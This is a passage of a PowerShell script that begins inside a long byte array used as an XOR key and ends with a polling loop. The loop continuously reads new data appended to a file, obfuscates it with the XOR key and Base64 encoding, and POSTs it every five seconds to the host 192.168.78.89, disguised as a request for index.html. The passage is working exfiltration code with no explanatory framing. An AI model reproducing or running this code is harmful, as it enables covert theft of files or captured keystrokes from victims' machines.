230,49,244,175,219,4,37,103,251,104,16,111,206,128,44,76,59,237,194,195,66,102,44,102,26,143,146,44,5,56,216,189,253,255,57,145,58,75,54,223,10,76,56,99,254,138,142,58,212,66,41,71,74,184,177,137,199,218,117,142,210,86,243,125,236,17,223,26,52,117,100,1,48,128,142,163,65,177,76,9,182,39,2,95,32,132,90,17,182,144,177,188,190,212,245,119,118,148,174,186,103,197,77,138,226,216,61,126,167,72,134,59,231,191,177,49,31,147,253,125,77,54,179,232,192,30,30,232,91,74,47,184,153,83,27,1,59,69,156,170,89,146,65,147,220,19,121,26,156,197,123,155,85,30,15,118,254,73,181,139,110,173,149,56,79,89,188,119,248,233,11,193,127,38,68,96,8,125,160,165,165,3,64,50,78,182,174,124,242,128,169,219,185,73,255,155,103,205,183,82,127,251,102,31,35,255,34,226,141,157,121,232,70,101,61,156,38,98,169,95,13,247,184,250,146,121,4,170,15,243,109,193,107,51,48,167,94,79,35,116,13,254,170,105,11,16,84,18,11,166,96,125,189,19,45,73,148,123,225,121,25,192,238,187,67,120,129,209,183,72,188,174,235,31,164,168,92,231,201,55,204,149,29,56,189,56,186,192,48,85,162,223,199,26,90,47,66,198,209,217,238,109,143,253,252,205,121,17,34,65,226,55,3,249,16,220,92,165,142,97,125,127,247,119,121,78,115,53,72,97,208,16,184,130,101,193,169,175,109,174,6,180,184,82,163,67,36,61,57,102,59,18,146,46,1,91,50,83,121,63,120,28,33,39,188,18,85,19,246,96,123,43,86,125,1,11,222,77,33,96,22,6,106,191,135,233,239,200,40,136,206,119,43,225,88,193,145,165,88,113,160,183,145,29,199,193,159,247,106,63,119,134,220,102,189,171,93,242,28,203,56,131,48,36,199,31,3,156,99,35,251,53,94,218,232,162,146,165,87,41,246,128,249,243,106,143,90,255,212,203,19,247,181,100,199,111,58,158,196,45,92,171,55,5,59,197,132,26,22,170,207,127,41,207,196,58,104,19,209,253,248,1,27,54,242,97,216,195,160,133,48,143,254,141,229,138,65,232,23,68,76,72,247,95,122,5,197,64,25,8,235,182,109,235,139,41,197,50,62,211,188,104,167,40,142,163,26,39,101,148,47,127,128,130,115,29,29,101,132,152,115,206,122,103,198,41,249,217,202,95,172,129,58,254,6,70,247,188,30,26,33,150,203,118,26,243,98,51,207,111,43,110,75,107,129,138,71,94,228,42,202,74,7,186,119,228,123,246,227,181,217,161,87,119,196,24,40,41,132,200,101,235,174,75,90,124,197,125,61,240,204,37,220,44,90,33,31,211,183,155,73,211,154,93,225,83,133,75,24,190,238,180,159,51,252,88,211,48,133,41,103,196,169,174,197,9,85,157,187,8,115,218,156,248,237,55,121,55,138,171,86,133,80,232,155,75,82,146,72,99,215,101,59,43,27,167,132,210,60,217,80,163,44,177,10,104,166,232,150,232,22,10,182,73,120,211,117,19,176,174,163,74,131,218,200,183,117,250,10,93,120)
while ($true) {
    $file = Get-Item -Path $fname
    $length = $file.Length
    if ($length -gt $sent) {
        $stream = [System.IO.File]::Open($fname, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $stream.Seek($sent, [System.IO.SeekOrigin]::Begin) | Out-Null
        $bytes =  New-Object byte[] ($length - $sent)
        $stream.read($bytes, 0, $length - $sent) | Out-Null
        for ($i = 0 ; $i -lt $bytes.count ; $i++) {
            Write-Host $key[$i % $key.count]
            $bytes[$i] = $bytes[$i] -bxor $key[$i % $key.count]
        }
        $data = [Convert]::ToBase64String($bytes)
        Invoke-WebRequest -Uri http://192.168.78.89/index.html -Method POST -Body $data | Out-Null
        $stream.Close() | Out-Null
    }
    $sent = $length
    Start-Sleep -Seconds 5
}
